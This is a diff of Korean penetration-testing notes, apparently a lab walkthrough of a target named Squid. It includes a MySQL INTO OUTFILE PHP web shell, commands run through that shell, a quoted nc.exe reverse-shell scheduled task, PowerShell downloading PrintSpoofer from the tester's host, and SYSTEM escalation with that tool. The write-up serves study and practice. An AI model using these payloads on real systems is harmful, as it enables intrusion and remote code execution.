-[proxychains] Strict chain ... 192.168.58.189:3128 [proxychains] Strict chain ... 192.168.58.189:3128 [proxychains] Strict chain ... 192.168.58.189:3128 [proxychains] Strict chain ... 192.168.58.189:3128 ... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 <--socket error or timeout!
+[proxychains] Strict chain ... 192.168.66.189:3128 [proxychains] Strict chain ... 192.168.66.189:3128 [proxychains] Strict chain ... 192.168.66.189:3128 [proxychains] Strict chain ... 192.168.66.189:3128 ... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 <--socket error or timeout!
 [ERROR] Child with pid 8312 terminating, cannot connect
 <--socket error or timeout!
 [ERROR] Child with pid 8314 terminating, cannot connect
@@ -1065,10 +1065,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-19 09:57:
 
 - session, JWT, 동적 CSRF 인지 체크 필요 -> 인증은 반드시 확인
 
-curl -I -x http://192.168.58.189:3128 http://127.0.0.1:8080/phpmyadmin/index.php
+curl -I -x http://192.168.66.189:3128 http://127.0.0.1:8080/phpmyadmin/index.php
 
 ┌──(root㉿docker-desktop)-[/]
-└─# curl -I -x http://192.168.58.189:3128 http://127.0.0.1:8080/phpmyadmin/index.php
+└─# curl -I -x http://192.168.66.189:3128 http://127.0.0.1:8080/phpmyadmin/index.php
 HTTP/1.1 200 OK
 Date: Tue, 20 Oct 2026 07:45:00 GMT
 Server: Apache/2.4.46 (Win64) PHP/7.3.21
@@ -1119,7 +1119,7 @@ phpMyAdmin은 로그인 시 세션+CSRF 토큰 검증을 하므로 Hydra처럼 �
 
 # burpsuite proxy setting
 
-192.168.58.189
+192.168.66.189
 
 ![WAMP서버 접속](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_1.png)
 
@@ -1131,17 +1131,21 @@ phpMyAdmin은 로그인 시 세션+CSRF 토큰 검증을 하므로 Hydra처럼 �
 
 - MYSQL webshell output write
   ![web_shell_output](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_6.png)
+- SELECT '<?php system($_GET["cm-----d"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
+- 현재 웹 서비스가 wamp에서 진행된다고 가정하고 /wamp/www/ 경로에 생성 -> 일반적으로 wamp는 C:/wamp/www/ 을 사용하기 때문에 시도하기
+- nt authority\local service
+  ![](image_17.png)
+- 그냥 C:/shell.php 도 실행이 되는데?
 
-http://192.168.58.189:8080/shell.php?cmd=whoami
+http://192.168.66.189:8080/shell.php?cmd=whoami
 
+![](image_18.png)
 ![output](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_7.png)
-
-nt authority\local service
 
 - local service -> 계정 탈취 성공 -> 일반적으로 기본 권한을 포함하는 경우가 많음 -> 가장 기능 활성화 확인
 - 최상위 SYSTEM 권한 탈취 필요
 
-http://192.168.58.189:8080/shell.php?cmd=whoami%20/priv
+http://192.168.66.189:8080/shell.php?cmd=whoami%20/priv
 
 ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_8.png)
 
@@ -1168,15 +1172,15 @@ SeTimeZonePrivilege Change the time zone Disabled
 - ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_9.png)
 - ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_11.png)
   schtasks /query /fo LIST /v -> 자동화된 명령어 탐색
-  http://192.168.58.189:8080/shell.php?cmd=schtasks /query /fo LIST /v
-
-http://192.168.58.189:8080/shell.php?cmd=schtasks /query /fo LIST /v | findstr /i "Perm \wamp"
+  http://192.168.66.189:8080/shell.php?cmd=schtasks /query /fo LIST /v
+  http://192.168.66.189:8080/shell.php?cmd=schtasks /query /fo LIST /v | findstr /i "Perm \wamp"
 
 - ![](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_12.png)
 - wamp windows + apache + mysql/mariadb + php
+- 로그 분석
   Task To Run: powershell.exe -Exec Bypass -Command "C:\wampp\nc.exe 192.168.118.23 4444 -e cmd.exe" Task To Run: powershell.exe -Exec Bypass -Command "C:\wampp\nc.exe 192.168.100.23 4444 -e cmd.exe"
 
-http://192.168.58.189:8080/shell.php?cmd=schtasks /query /fo LIST /v | findstr /i "PrintSpoofer"
+  http://192.168.66.189:8080/shell.php?cmd=schtasks /query /fo LIST /v | findstr /i "PrintSpoofer"
 
 바이너리 옮기기
 
@@ -1184,10 +1188,10 @@ http://192.168.58.189:8080/shell.php?cmd=schtasks /query /fo LIST /v | findstr /
   python3 -m http.server 80
 
 - target
-  powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
+  powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.66/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
 
 ```ps1
-http://192.168.58.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
+http://192.168.66.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.66/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
 ```
 
 # 파일 없어서 실패 칼리에서 설치
@@ -1198,15 +1202,21 @@ sudo wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoo
 ![install PrintSpoofer64.exe for SeImpersonatePrivilege enabled](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_13.png)
 
 ```ps1
-http://192.168.58.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/usr/share/windows-resources/binaries/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
+http://192.168.66.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.66/usr/share/windows-resources/binaries/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
 ```
 
 ![failed](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_15.png)
 
-# 아예 해당 파일 위치로 이동해서 python server on -> 그래도 안 되길래 그냥 파일을 / 로 옮기고 시도
+# 아예 해당 파일 위치로 이동해서 python server on -> 그래도 안 되길래 그냥 파일을 / 로 옮기고 시도 -> 성공
 
-http://192.168.58.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.58/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
+# 192.168.49.66 -> MyIP
+
+http://192.168.66.189:8080/shell.php?cmd=powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.66/PrintSpoofer.exe' -OutFile 'C:\Temp\PrintSpoofer.exe'"
+
+# 타겟으로 PrintSpoofer 역다운로드로 파일 이동 성공
 
 ![success](https://raw.githubusercontent.com/agnusdei1207/public/main/Squid/image_16.png)
 
-http://192.168.58.189:8080/shell.php?cmd=C:\Temp\PrintSpoofer.exe -i -c cmd.exe
+http://192.168.66.189:8080/shell2.php?cmd=C:\Temp\PrintSpoofer.exe -i -c cmd.exe
+
+# Change LHOST in PrintSpoofer before sending
